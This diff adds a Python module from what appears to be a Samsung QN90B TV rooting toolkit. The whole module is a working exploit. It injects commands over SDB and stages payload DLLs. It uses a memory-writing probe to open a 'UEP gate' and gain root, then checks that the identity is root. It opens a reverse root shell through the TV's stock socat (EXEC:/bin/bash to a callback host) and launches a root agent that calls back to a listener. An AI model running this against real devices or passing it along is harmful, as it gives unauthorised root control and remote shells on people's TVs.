@@ -1,0 +1,376 @@
+from __future__ import annotations
+
+import os
+import shlex
+import socket
+import threading
+import asyncio
+import contextlib
+import secrets
+import tempfile
+from collections.abc import Callable
+from dataclasses import dataclass
+from pathlib import Path, PurePosixPath
+
+from .compatibility import (
+    QN90B_PROFILE,
+    TargetAssessment,
+    TargetCompatibilityError,
+)
+from .sdb import CaptureResult, SdbClient, SdbError, find_sdb, route_callback_host
+from .terminal import relay_socket
+from .root_agent import (
+    RootAgentConnection,
+    RootAgentServer,
+    generate_secret,
+    write_secret,
+)
+
+
+REMOTE_DIRECTORY = PurePosixPath(
+    "/home/owner/share/tmp/sdk_tools/samsung-tv-root/qn90b"
+)
+REMOTE_PROBE = REMOTE_DIRECTORY / "FdetProbe.dll"
+REMOTE_RUNTIME_CONFIG = REMOTE_DIRECTORY / "FdetProbe.runtimeconfig.json"
+REMOTE_AGENT = REMOTE_DIRECTORY / "SamsungTvRootAgent.dll"
+REMOTE_AGENT_RUNTIME_CONFIG = REMOTE_DIRECTORY / "SamsungTvRootAgent.runtimeconfig.json"
+REMOTE_INPUT_AGENT = REMOTE_DIRECTORY / "SamsungTvRemoteInputAgent.dll"
+REMOTE_INPUT_AGENT_RUNTIME_CONFIG = (
+    REMOTE_DIRECTORY / "SamsungTvRemoteInputAgent.runtimeconfig.json"
+)
+REMOTE_EVENT_AGENT = REMOTE_DIRECTORY / "SamsungTvEventAgent.dll"
+REMOTE_EVENT_AGENT_RUNTIME_CONFIG = (
+    REMOTE_DIRECTORY / "SamsungTvEventAgent.runtimeconfig.json"
+)
+REMOTE_SOURCE_CONTROL = REMOTE_DIRECTORY / "Qn90bSourceControl.dll"
+REMOTE_SOURCE_CONTROL_RUNTIME_CONFIG = (
+    REMOTE_DIRECTORY / "Qn90bSourceControl.runtimeconfig.json"
+)
+REMOTE_DISPLAY_CONTROL = REMOTE_DIRECTORY / "Qn90bDisplayControl.dll"
+REMOTE_DISPLAY_CONTROL_RUNTIME_CONFIG = (
+    REMOTE_DIRECTORY / "Qn90bDisplayControl.runtimeconfig.json"
+)
+SCAN_START = "0x20000000"
+SCAN_LENGTH = "0x4a000000"
+UEP_GATE_PHYSICAL = "0x208c26c4"
+UEP_GATE_CLOSED = "0x00000001"
+UEP_GATE_OPEN = "0x00000000"
+STOCK_SOCAT = PurePosixPath("/opt/usr/apps/com.samsung.tizen.smartthings-hub/bin/socat")
+
+
+class Qn90bError(RuntimeError):
+    pass
+
+
+@dataclass(frozen=True)
+class Qn90bRootEvidence:
+    output: str
+
+    def validate(self) -> None:
+        lines = frozenset(line.strip() for line in self.output.splitlines())
+        required = (
+            "uid_after=0",
+            "euid_after=0",
+            "gid_after=0",
+            "egid_after=0",
+            "exec_begin",
+        )
+        missing = tuple(marker for marker in required if marker not in lines)
+        if missing:
+            raise Qn90bError(
+                "QN90B exploit did not establish a complete root identity; missing "
+                + ", ".join(missing)
+            )
+
+
+class Qn90bRootExploit:
+    def __init__(
+        self,
+        tv_host: str,
+        payload_directory: Path,
+        *,
+        sdb_timeout: float = 15.0,
+    ) -> None:
+        self.tv_host = tv_host
+        self.payload_directory = payload_directory.resolve()
+        self.sdb = SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
+
+    def preflight(
+        self,
+        *,
+        require_tested: bool = False,
+        callback_host: str | None = None,
+        bind_host: str | None = None,
+        port: int = 0,
+        on_listening: Callable[[str, str, int], None] | None = None,
+    ) -> TargetAssessment:
+        self.sdb.connect()
+        self.sdb.require_device()
+        result = self.sdb.capture(
+            QN90B_PROFILE.probe_command(),
+            callback_host=callback_host,
+            bind_host=bind_host,
+            port=port,
+            timeout=20.0,
+            on_listening=on_listening,
+        )
+        if not result.output.strip():
+            raise Qn90bError(
+                "preflight callback connected but returned no output "
+                f"(SDB injection exit {result.transport_returncode})"
+            )
+        assessment = QN90B_PROFILE.assess(result.output)
+        try:
+            if require_tested:
+                assessment.require_tested("QN90B UEP control")
+            else:
+                assessment.require_compatible()
+        except TargetCompatibilityError as error:
+            raise Qn90bError(str(error)) from error
+        return assessment
+
+    def stage(self) -> None:
+        required = {
+            "FdetProbe.dll": REMOTE_PROBE,
+            "FdetProbe.runtimeconfig.json": REMOTE_RUNTIME_CONFIG,
+            "SamsungTvRootAgent.dll": REMOTE_AGENT,
+            "SamsungTvRootAgent.runtimeconfig.json": REMOTE_AGENT_RUNTIME_CONFIG,
+            "SamsungTvRemoteInputAgent.dll": REMOTE_INPUT_AGENT,
+            "SamsungTvRemoteInputAgent.runtimeconfig.json": REMOTE_INPUT_AGENT_RUNTIME_CONFIG,
+            "SamsungTvEventAgent.dll": REMOTE_EVENT_AGENT,
+            "SamsungTvEventAgent.runtimeconfig.json": REMOTE_EVENT_AGENT_RUNTIME_CONFIG,
+            "Qn90bSourceControl.dll": REMOTE_SOURCE_CONTROL,
+            "Qn90bSourceControl.runtimeconfig.json": REMOTE_SOURCE_CONTROL_RUNTIME_CONFIG,
+            "Qn90bDisplayControl.dll": REMOTE_DISPLAY_CONTROL,
+            "Qn90bDisplayControl.runtimeconfig.json": REMOTE_DISPLAY_CONTROL_RUNTIME_CONFIG,
+        }
+        missing = tuple(
+            name for name in required if not (self.payload_directory / name).is_file()
+        )
+        if missing:
+            raise Qn90bError(
+                "missing built QN90B payloads: "
+                + ", ".join(missing)
+                + "; run make payloads"
+            )
+        self.sdb.connect()
+        result = self.sdb.inject(f"/bin/mkdir -p {REMOTE_DIRECTORY}")
+        if result.returncode not in (0, 1):
+            raise Qn90bError("failed to create the QN90B staging directory")
+        for name, remote_path in required.items():
+            self.sdb.push(self.payload_directory / name, remote_path)
+
+    def execute(self, command: str, *, timeout: float = 45.0) -> CaptureResult:
+        tag = f"qnroot{os.urandom(4).hex()}"[:15]
+        invocation = shlex.join(
+            (
+                "/usr/bin/dotnet",
+                str(REMOTE_PROBE),
+                "srs",
+                SCAN_START,
+                SCAN_LENGTH,
+                tag,
+                command,
+            )
+        )
+        result = self.sdb.capture(invocation, timeout=timeout)
+        Qn90bRootEvidence(result.output).validate()
+        return result
+
+    def read_uep_gate(self) -> CaptureResult:
+        invocation = shlex.join(
+            (
+                "/usr/bin/dotnet",
+                str(REMOTE_PROBE),
+                "rw",
+                UEP_GATE_PHYSICAL,
+                "1",
+            )
+        )
+        return self.sdb.capture(invocation, timeout=15.0)
+
+    def disable_uep(self) -> CaptureResult:
+        invocation = shlex.join(
+            (
+                "/usr/bin/dotnet",
+                str(REMOTE_PROBE),
+                "wwi",
+                UEP_GATE_PHYSICAL,
+                "0",
+                UEP_GATE_CLOSED,
+                UEP_GATE_OPEN,
+            )
+        )
+        result = self.sdb.capture(invocation, timeout=15.0)
+        if UEP_GATE_OPEN not in result.output:
+            raise Qn90bError("QN90B UEP transition did not report the open value")
+        return result
+
+    def shell(self, *, timeout: float = 45.0) -> None:
+        callback_host = route_callback_host(self.tv_host)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
+            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            listener.bind((callback_host, 0))
+            listener.listen(1)
+            listener.settimeout(timeout)
+            callback_port = int(listener.getsockname()[1])
+            command = shlex.join(
+                (
+                    str(STOCK_SOCAT),
+                    f"TCP:{callback_host}:{callback_port}",
+                    "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+                )
+            )
+            state: dict[str, BaseException] = {}
+
+            def launch() -> None:
+                try:
+                    self.execute(command, timeout=timeout)
+                except BaseException as error:
+                    state["error"] = error
+
+            worker = threading.Thread(target=launch, name="qn90b-root", daemon=True)
+            worker.start()
+            try:
+                connection, address = listener.accept()
+            except TimeoutError as error:
+                failure = state.get("error")
+                if failure is not None:
+                    raise Qn90bError(str(failure)) from failure
+                raise Qn90bError(
+                    f"QN90B root shell did not connect within {timeout:g}s"
+                ) from error
+            print(f"root shell: {address[0]}:{address[1]}", flush=True)
+            with connection:
+                relay_socket(connection)
+
+
+@dataclass(frozen=True)
+class Qn90bRootSessionConfig:
+    tv_host: str
+    callback_host: str
+    bind_host: str
+    listener_port: int
+    accept_timeout: float
+    command_timeout: float
+    payload_directory: Path
+    sdb_timeout: float = 15.0
+
+
+@dataclass
+class Qn90bRootLease:
+    config: Qn90bRootSessionConfig
+    connection: RootAgentConnection
+    closing_listener: asyncio.Server | None = None
+
+    async def shutdown(self) -> None:
+        await self.connection.shutdown(self.config.command_timeout)
+
+    async def close(self) -> None:
+        await self.connection.close()
+        if self.closing_listener is not None:
+            await self.closing_listener.wait_closed()
+
+
+class Qn90bRootAcquirer:
+    def __init__(self, config: Qn90bRootSessionConfig) -> None:
+        self.config = config
+        self.exploit = Qn90bRootExploit(
+            config.tv_host,
+            config.payload_directory,
+            sdb_timeout=config.sdb_timeout,
+        )
+
+    async def acquire(self) -> Qn90bRootLease:
+        await asyncio.to_thread(self.exploit.preflight)
+        await asyncio.to_thread(self.exploit.stage)
+        with tempfile.TemporaryDirectory(prefix="qn90b-root-session-") as directory:
+            secret = generate_secret()
+            token_path = Path(directory) / "root-agent.token"
+            empty_path = Path(directory) / "empty"
+            remote_token = REMOTE_DIRECTORY / f"t-{secrets.token_hex(8)}"
+            remote_log = REMOTE_DIRECTORY / f"l-{secrets.token_hex(8)}"
+            write_secret(token_path, secret)
+            empty_path.write_bytes(b"")
+            await asyncio.to_thread(self.exploit.sdb.push, token_path, remote_token)
+            server = RootAgentServer(
+                self.config.bind_host,
+                self.config.listener_port,
+                self.config.tv_host,
+                secret,
+                require_root=True,
+            )
+            await server.start()
+            try:
+                command = (
+                    shlex.join(
+                        (
+                            "/usr/bin/dotnet",
+                            str(REMOTE_AGENT),
+                            self.config.callback_host,
+                            str(server.listening_port),
+                            str(remote_token),
+                            str(REMOTE_DIRECTORY),
+                        )
+                    )
+                    + f" >{shlex.quote(str(remote_log))} 2>&1 </dev/null &"
+                )
+                launch = asyncio.create_task(
+                    asyncio.to_thread(
+                        self.exploit.execute,
+                        command,
+                        timeout=max(self.config.accept_timeout + 15.0, 30.0),
+                    )
+                )
+                try:
+                    connection = await server.accept(self.config.accept_timeout)
+                    await launch
+                    identity = await connection.ping(self.config.command_timeout)
+                    if any(
+                        value != 0
+                        for value in (
+                            identity.uid,
+                            identity.euid,
+                            identity.gid,
+                            identity.egid,
+                        )
+                    ):
+                        raise Qn90bError("QN90B root agent lost its root identity")
+                    closing_listener = server.detach(connection)
+                    return Qn90bRootLease(
+                        config=self.config,
+                        connection=connection,
+                        closing_listener=closing_listener,
+                    )
+                except BaseException:
+                    if not launch.done():
+                        launch.cancel()
+                    with contextlib.suppress(BaseException):
+                        await launch
+                    raise
+            except BaseException:
+                with contextlib.suppress(Exception):
+                    await asyncio.to_thread(
+                        self.exploit.sdb.push,
+                        empty_path,
+                        remote_token,
+                    )
+                raise
+            finally:
+                await server.close()
+
+
+def create_exploit(
+    host: str,
+    payload_directory: Path,
+    *,
+    sdb_timeout: float,
+) -> Qn90bRootExploit:
+    try:
+        return Qn90bRootExploit(
+            host,
+            payload_directory,
+            sdb_timeout=sdb_timeout,
+        )
+    except SdbError as error:
+        raise Qn90bError(str(error)) from error
